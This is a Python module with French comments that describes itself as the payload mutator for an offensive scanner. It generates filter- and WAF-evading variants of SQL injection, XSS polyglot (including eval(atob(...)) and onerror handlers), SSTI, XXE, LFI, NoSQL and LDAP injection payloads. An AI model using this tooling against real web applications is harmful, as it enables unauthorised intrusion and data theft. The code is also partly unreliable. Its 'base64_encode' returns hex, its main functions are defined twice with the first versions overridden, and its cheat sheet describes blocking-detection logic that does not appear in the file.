#!/usr/bin/env python3
"""
Mutator avancé pour scanner offensif (plug & play avec injector.py)
Supporte mutation contextuelle, combinaisons, randomisation, WAF bypass, polyglottes, split avancé, etc.
Limitateur intégré : max_mutations par mutation, pour éviter l'explosion du nombre de requêtes.
"""

import urllib.parse
import html
import random
import re

# --- Encodages et mutations de base ---
def url_encode(payload): return urllib.parse.quote(payload)
def double_url_encode(payload): return urllib.parse.quote(urllib.parse.quote(payload))
def html_encode(payload): return html.escape(payload)
def unicode_escape(payload): return ''.join(['\\u{:04x}'.format(ord(c)) for c in payload])
def html_decimal(payload): return ''.join([f"&#{ord(c)};" for c in payload])
def base64_encode(payload): return payload.encode('utf-8').hex()
def rot13(payload): return payload.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz','NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
def random_case(payload): return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
def reverse(payload): return payload[::-1]
def space_pad(payload): return f" {payload} "
def break_up(payload, sep="/**/"): return sep.join(payload)
def break_sql(payload): return re.sub(r"([A-Za-z])", r"\1/**/", payload)
def between(payload, left, right): return f"{left}{payload}{right}"

# --- Mutations contextuelles/vecteur spécifiques ---
def sqli_mutations(payload):
    return [
        payload,
        sql_comment(payload),
        sql_concat(payload),
        break_sql(payload),
        url_encode(payload),
        html_encode(payload),
        unicode_escape(payload),
        random_case(payload),
        base64_encode(payload),
        space_pad(payload),
        payload.replace(' ', '/**/'),
        payload.replace("'", '"'),
        between(payload, '(', ')'),
        payload.replace('select', 'SeLeCt').replace('union', 'UNION'),
        payload.replace('or', 'oorr')
    ]

def sql_comment(payload): return f"{payload}-- -"
def sql_concat(payload): return f"'||(SELECT '{payload}')||'"
def sql_blind(payload): return f"{payload}' AND ASCII(SUBSTR((SELECT user()),1,1))>80-- -"

def xss_polyglot(payload):
    return [
        f"<script>{payload}</script>",
        f"<svg/onload={payload}>",
        f"'><img src=x onerror={payload}>",
        f"<iframe srcdoc='<script>{payload}</script>'>",
        f"<details open ontoggle={payload}>",
        f"<img src=x onerror='eval(atob(\"{base64_encode(payload)}\"))'>",
        html_decimal(payload),
        payload.replace('alert', 'prompt'),
        url_encode(payload)
    ]

def ssti_mutations(payload):
    return [
        f"{{{{ {payload} }}}}",           # Jinja2
        f"${{{payload}}}",                # Velocity / Java EL
        f"<%= {payload} %>",              # JSP
        f"{{% {payload} %}}",             # Jinja2 block
        unicode_escape(payload),
        base64_encode(payload),
        random_case(payload),
    ]

def xxe_mutations(payload):
    return [
        payload,
        payload.replace("file", "FILE"),
        payload.replace("/etc/passwd", "/etc//passwd"),
        payload.replace('"', "'"),
        url_encode(payload),
        unicode_escape(payload),
        payload.replace('SYSTEM', 'SYSTEM\t'), # Obfuscation
    ]

def lfi_mutations(payload):
    return [
        payload,
        payload.replace("../", "..;/"),
        payload.replace("/", "//"),
        url_encode(payload),
        double_url_encode(payload),
        base64_encode(payload),
        html_encode(payload),
        payload.replace('etc', 'e/tc'),
        payload.replace('passwd', 'pass%73wd')
    ]

def nosql_mutations(payload):
    return [
        payload,
        payload.replace('"', "'"),
        url_encode(payload),
        html_encode(payload),
        base64_encode(payload),
        payload.replace('$ne', '$notne')
    ]

def ldap_mutations(payload):
    return [
        payload,
        payload.replace('*', '%2a'),
        url_encode(payload),
        payload.replace('admin', 'adm%69n'),
        random_case(payload)
    ]

# --- Génération combinatoire (combos de mutations) ---
def combine_mutations(payload, mutations, depth=2):
    result = set([payload])
    stack = [(payload, 0)]
    while stack:
        current, d = stack.pop()
        if d >= depth: continue
        for mut in mutations:
            mutated = mut(current)
            if mutated not in result:
                result.add(mutated)
                stack.append((mutated, d+1))
    return list(result)

# --- Mutations par contexte (main logic) ---
def mutate(payload, context="query", family=None, polyglot=True, max_mutations=20):
    """
    Mutate un payload, retourne une liste de mutations (max max_mutations)
    """
    # Base mutations
    mutations = [
        url_encode, double_url_encode, html_encode, unicode_escape, html_decimal, random_case, reverse, space_pad
    ]
    # Polyglot et obfuscations par vecteur/famille
    if family:
        fam = family.lower()
        if fam == "sqli":
            result = sqli_mutations(payload)
            result += combine_mutations(payload, [url_encode, html_encode, random_case], depth=2)
        elif fam == "xss":
            result = xss_polyglot(payload)
            result += combine_mutations(payload, [html_encode, url_encode, random_case], depth=2)
        elif fam == "ssti":
            result = ssti_mutations(payload)
            result += combine_mutations(payload, [unicode_escape, base64_encode, random_case], depth=2)
        elif fam == "xxe":
            result = xxe_mutations(payload)
            result += combine_mutations(payload, [url_encode, unicode_escape], depth=2)
        elif fam == "lfi":
            result = lfi_mutations(payload)
            result += combine_mutations(payload, [url_encode, double_url_encode, base64_encode], depth=2)
        elif fam == "nosql":
            result = nosql_mutations(payload)
        elif fam == "ldap":
            result = ldap_mutations(payload)
        else:
            # Generic context/fallback
            result = [payload]
            result += [mut(payload) for mut in mutations]
    else:
        result = [payload]
        result += [mut(payload) for mut in mutations]

    # Ajoute mutations combinatoires si polyglot
    if polyglot and family in ["xss", "ssti"]:
        poly = []
        for p in result:
            poly += combine_mutations(p, [url_encode, html_encode, unicode_escape, random_case], depth=2)
        result += poly

    # Limiteur de mutations
    mutations_final = list(set(result))
    if max_mutations is not None and len(mutations_final) > max_mutations:
        random.shuffle(mutations_final)
        mutations_final = mutations_final[:max_mutations]
    return mutations_final

def mutate_payloads(payloads, context="query", family=None, polyglot=True, max_mutations=20):
    """
    Mutate une liste de payloads pour un contexte donné et une famille de vecteur.
    Returns: liste des payloads mutés (sans doublon), limité à max_mutations au total.
    """
    result = set()
    for p in payloads:
        result.update(mutate(p, context=context, family=family, polyglot=polyglot, max_mutations=max_mutations))
        if max_mutations is not None and len(result) >= max_mutations:
            break
    result_list = list(result)
    if max_mutations is not None and len(result_list) > max_mutations:
        random.shuffle(result_list)
        result_list = result_list[:max_mutations]
    return result_list

# --- Cheat sheet rapide (résumé des mutations utilisées) ---
__cheat_sheet__ = """
Mutations incluses :
- url_encode, double_url_encode, html_encode, unicode_escape, html_decimal
- random_case, reverse, space_pad, break_up, break_sql, base64_encode, rot13
- Mutations spécifiques : XSS polyglot, SQLi obfusquée, SSTI multi-syntaxe, XXE obfusquée, LFI encodée, NoSQL, LDAP, etc.
- Combinaison automatique jusqu'à 2 niveaux (ex: url+html, html+unicode…)
- Polyglot injection (XSS, SSTI)
- Split, casing, encodage mixte, mutation combinatoire
- Limiteur de mutations (max_mutations) intégré
- Mutations activables à la volée si blocage détecté (logique is_blocked)
"""

# -- Fin du mutator.py --

class PayloadMutator:
    """Classe pour gérer les mutations de payloads de manière organisée"""
    
    def __init__(self):
        # Mutations de base communes à toutes les familles
        self.base_mutations = [
            url_encode, double_url_encode, html_encode, 
            unicode_escape, html_decimal, random_case, 
            reverse, space_pad
        ]
        
        # Mapping des mutations spécifiques par famille
        self.family_mutations = {
            "sqli": (sqli_mutations, [url_encode, html_encode, random_case]),
            "xss": (xss_polyglot, [html_encode, url_encode, random_case]),
            "ssti": (ssti_mutations, [unicode_escape, base64_encode, random_case]),
            "xxe": (xxe_mutations, [url_encode, unicode_escape]),
            "lfi": (lfi_mutations, [url_encode, double_url_encode, base64_encode]),
            "nosql": (nosql_mutations, None),
            "ldap": (ldap_mutations, None)
        }

    def mutate(self, payload, context="query", family=None, polyglot=True, max_mutations=20):
        """Mutate un payload selon son contexte et sa famille"""
        result = [payload]
        
        # Ajout des mutations de base si pas de famille spécifique
        if not family:
            result.extend(mut(payload) for mut in self.base_mutations)
            return result[:max_mutations]
            
        # Mutations spécifiques à la famille
        family = family.lower()
        if family in self.family_mutations:
            specific_mutation, combine_with = self.family_mutations[family]
            
            # Ajouter mutations spécifiques
            if specific_mutation:
                result.extend(specific_mutation(payload))
                
            # Ajouter mutations combinatoires si demandé
            if combine_with and polyglot:
                result.extend(combine_mutations(payload, combine_with, depth=2))
        else:
            # Fallback sur mutations de base
            result.extend(mut(payload) for mut in self.base_mutations)
            
        return list(set(result))[:max_mutations]

    def mutate_payloads(self, payloads, context="query", family=None, polyglot=True, max_mutations=20):
        """Mutate une liste de payloads"""
        result = set()
        for p in payloads:
            result.update(self.mutate(p, context, family, polyglot, max_mutations))
            if max_mutations and len(result) >= max_mutations:
                break
                
        result_list = list(result)
        if max_mutations and len(result_list) > max_mutations:
            random.shuffle(result_list)
            result_list = result_list[:max_mutations]
        return result_list

# Instance globale du mutator
_mutator = PayloadMutator()

def mutate(payload, context="query", family=None, polyglot=True, max_mutations=20):
    """Wrapper pour la méthode mutate de l'instance globale"""
    return _mutator.mutate(payload, context, family, polyglot, max_mutations)

def mutate_payloads(payloads, context="query", family=None, polyglot=True, max_mutations=20):
    """Wrapper pour la méthode mutate_payloads de l'instance globale"""
    return _mutator.mutate_payloads(payloads, context, family, polyglot, max_mutations)
